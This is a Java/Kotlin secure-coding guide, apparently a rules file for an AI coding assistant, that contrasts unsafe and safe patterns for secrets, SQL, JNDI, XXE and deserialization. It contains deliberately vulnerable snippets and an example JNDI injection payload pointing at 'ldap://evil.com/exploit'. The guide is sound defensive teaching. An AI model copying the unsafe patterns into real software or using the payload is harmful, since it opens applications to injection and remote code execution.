---
paths:
  - "**/*.java"
  - "**/*.kt"
  - "**/pom.xml"
  - "**/build.gradle*"
---
# Java/Kotlin Security

> This file extends [common/security.md](../common/security.md) with Java/Kotlin-specific content.

## Secret Management

```java
// NEVER: Hardcoded secrets
private static final String API_KEY = "sk-proj-xxxxx";

// ALWAYS: Environment variables or externalized config
String apiKey = System.getenv("OPENAI_API_KEY");
if (apiKey == null || apiKey.isBlank()) {
    throw new IllegalStateException("OPENAI_API_KEY not configured");
}

// BEST: Spring Boot externalized configuration
@ConfigurationProperties(prefix = "app.secrets")
public record SecretsConfig(String apiKey, String dbPassword) {
    public SecretsConfig {
        Objects.requireNonNull(apiKey, "app.secrets.api-key must be configured");
    }
}
```

## SQL Injection Prevention

```java
// NEVER: String concatenation in queries
String query = "SELECT * FROM users WHERE email = '" + email + "'";

// ALWAYS: PreparedStatement with parameterized queries
try (var ps = connection.prepareStatement("SELECT * FROM users WHERE email = ?")) {
    ps.setString(1, email);
    try (var rs = ps.executeQuery()) {
        // process results
    }
}

// ALWAYS: JPA named parameters
@Query("SELECT u FROM User u WHERE u.email = :email")
Optional<User> findByEmail(@Param("email") String email);

// ALWAYS: Criteria API for dynamic queries
CriteriaBuilder cb = em.getCriteriaBuilder();
CriteriaQuery<User> cq = cb.createQuery(User.class);
Root<User> root = cq.from(User.class);
cq.where(cb.equal(root.get("email"), email));
```

## Input Validation with Bean Validation

```java
// Use Jakarta Bean Validation (JSR 380) annotations
public record CreateUserRequest(
    @NotBlank(message = "Name is required")
    @Size(min = 2, max = 100, message = "Name must be between 2 and 100 characters")
    String name,

    @NotBlank(message = "Email is required")
    @Email(message = "Email must be a valid email address")
    String email,

    @NotNull(message = "Age is required")
    @Min(value = 0, message = "Age must be non-negative")
    @Max(value = 150, message = "Age must be at most 150")
    Integer age
) {}

// Validate in controller
@PostMapping("/users")
ResponseEntity<UserResponse> createUser(@Valid @RequestBody CreateUserRequest request) {
    // request is already validated at this point
    return ResponseEntity.status(HttpStatus.CREATED)
        .body(userService.createUser(request));
}

// Custom validator for complex rules
@Constraint(validatedBy = StrongPasswordValidator.class)
@Target(ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
public @interface StrongPassword {
    String message() default "Password does not meet strength requirements";
    Class<?>[] groups() default {};
    Class<? extends Payload>[] payload() default {};
}
```

## JNDI Injection Protection

```java
// NEVER: Unvalidated JNDI lookups
String name = request.getParameter("name");
ctx.lookup(name); // Attacker can inject "ldap://evil.com/exploit"

// ALWAYS: Validate and restrict JNDI names
private static final Set<String> ALLOWED_NAMES = Set.of("java:comp/env/jdbc/mydb");

String name = request.getParameter("name");
if (!ALLOWED_NAMES.contains(name)) {
    throw new SecurityException("JNDI name not in allowlist: " + name);
}
ctx.lookup(name);

// Ensure Log4j is updated (CVE-2021-44228)
// In pom.xml: log4j-core >= 2.17.1
// Or set: log4j2.formatMsgNoLookups=true
```

## XXE Prevention

```java
// ALWAYS: Disable external entities in XML parsers
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// SAX parser
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

## Deserialization Safety

```java
// NEVER: Deserialize untrusted data with ObjectInputStream
ObjectInputStream ois = new ObjectInputStream(untrustedStream);
Object obj = ois.readObject(); // Remote code execution risk

// ALWAYS: Use safe serialization formats (JSON with Jackson)
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    mapper.getPolymorphicTypeValidator(),
    ObjectMapper.DefaultTyping.NON_FINAL
);
// Configure allowlist for polymorphic types
mapper.setPolymorphicTypeValidator(
    BasicPolymorphicTypeValidator.builder()
        .allowIfSubType("com.example.domain")
        .build()
);
```

## Dependency Scanning

```xml
<!-- Maven: OWASP Dependency-Check Plugin -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.0</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
    </configuration>
</plugin>
```

```groovy
// Gradle: OWASP Dependency-Check Plugin
plugins {
    id 'org.owasp.dependencycheck' version '9.0.0'
}

dependencyCheck {
    failBuildOnCVSS = 7.0f
    suppressionFile = 'config/owasp-suppressions.xml'
}
```

## Security Scanning

```bash
# OWASP dependency scan
mvn dependency-check:check
gradle dependencyCheckAnalyze

# SpotBugs with Find Security Bugs plugin
mvn spotbugs:check -Dspotbugs.plugins=com.h3xstream.findsecbugs:findsecbugs-plugin

# Snyk (if configured)
snyk test --all-projects
```

## Reference

See skill: `springboot-security` for Spring Security configuration patterns.
See skill: `security-review` for general security review workflow.
